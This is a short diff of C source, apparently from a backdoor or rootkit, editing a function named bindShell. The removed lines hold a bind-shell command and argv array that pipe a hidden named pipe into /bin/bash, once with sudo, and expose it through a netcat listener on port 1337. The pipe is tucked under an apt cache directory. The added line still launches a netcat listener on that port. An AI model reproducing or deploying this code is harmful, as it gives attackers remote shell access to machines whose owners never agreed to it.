@@ -147,9 +147,8 @@ static int makePipe(void){
 }
 
 static int bindShell(void){
-	makePipe();
-	// while true; do cat /var/cache/apt/archives/null | sudo /bin/bash 2>&1 |/bin/nc -l 1337 >/var/cache/apt/archives/null; done >/dev/null &
-	char* argv[] = {"while", "true;", "do", "cat", "/var/cache/apt/archives/null", "|", "/bin/bash", "2>&1", "|", "/bin/nc", "-l", "1337", ">/var/cache/apt/archives/null;", "done", ">/dev/null", "&", NULL};
+	//makePipe();
+	char* argv[] = {"/bin/nc", "-l", "1337", ">/dev/null", "&", NULL};
 	static char* env[] = {
 		"HOME=/",
 		"TERM=linux",
